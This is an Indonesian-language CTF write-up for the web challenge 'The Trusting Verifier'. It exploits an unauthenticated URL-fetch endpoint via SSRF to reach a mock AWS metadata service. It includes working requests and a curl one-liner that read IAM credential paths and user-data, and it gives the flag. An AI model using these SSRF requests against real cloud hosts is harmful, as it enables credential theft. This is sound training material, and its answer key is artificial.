---
ctf: "RIFFHACK 2026"
kategori: "Web"
challenge: "The Trusting Verifier"
flag: "bitflag{ssrf_1s_4_p4rty_cr4sh3r}"
teknik: "SSRF tanpa allow-list pada /api/vendor/verify-website menjangkau IMDS AWS tiruan di 169.254.169.254"
sumber: "https://github.com/Abdelkad3r/RIFFHACK/tree/main/10-the-trusting-verifier"
---

# The Trusting Verifier — RIFFHACK 2026 (Web)

## Deskripsi Singkat

Alur `/vendor-application` punya tombol "verify website" yang melakukan fetch server-side atas URL apa pun yang kamu berikan dan mengembalikan body respons-nya. Tanpa allow-list. IMDS AWS tiruan di `169.254.169.254` bisa dijangkau. Flag-nya hidup di env var yang di-export bootstrap script yang disajikan IMDS di `latest/user-data`.

## Analisis

Field `body` di respons adalah respons literal yang di-fetch server. Apa pun yang bisa kamu sebutkan lewat `http://` atau `https://` akan di-fetch dan dikembalikan. Satu-satunya filter adalah allow-list skema; tidak ada filtering IP atau hostname, tidak ada penolakan range link-local atau RFC1918.

## Eksploitasi / Solusi

```bash
$ POST {"website":"http://169.254.169.254/latest/meta-data/"}
{"body":"instance-id\nhostname\niam/security-credentials/\nplacement/region\n"}

$ POST {"website":"http://169.254.169.254/latest/meta-data/iam/security-credentials/RiffhackVendorVerifierRole"}
{"body":"{\"Code\":\"Success\",\"Token\":\"bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}\",...}"}

$ POST {"website":"http://169.254.169.254/latest/user-data"}
{"body":"#!/bin/sh\nexport MARKETPLACE_ENV=ctf\nexport TRUSTING_VERIFIER_FLAG=bitflag{ssrf_1s_4_p4rty_cr4sh3r}\nnode server.js\n"}
```

Dua nilai berbentuk-flag di permukaan ini: field `Token` IAM (umpan untuk brief ini) dan env var `TRUSTING_VERIFIER_FLAG` (jawaban sungguhan). Judul challenge-nya *adalah* nama env var-nya — begitu pembuat challenge menamai flag sesuai nama env var, pencocokan brief-ke-permukaan sudah dilakukan untukmu.

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"website":"http://169.254.169.254/latest/user-data"}' \
  http://<host>/api/vendor/verify-website \
  | grep -oE 'bitflag\{[^}]+\}'
# bitflag{ssrf_1s_4_p4rty_cr4sh3r}
```

Tanpa login diperlukan; form aplikasi vendor dimaksudkan untuk pengunjung pertama kali dan endpoint-nya tidak diautentikasi.

## Catatan / Insight

IMDS tiruan ini adalah karikatur setia dari IMDSv1 milik AWS sungguhan: GET tanpa autentikasi di `latest/meta-data/`, `iam/security-credentials/<role>`, dan `latest/user-data`. Melatih SSRF terhadapnya adalah muscle memory persis yang menangkap varian dunia nyata, yang sudah menghasilkan puluhan insiden kebocoran kredensial produksi selama dekade terakhir.

## Flag

```
bitflag{ssrf_1s_4_p4rty_cr4sh3r}
```
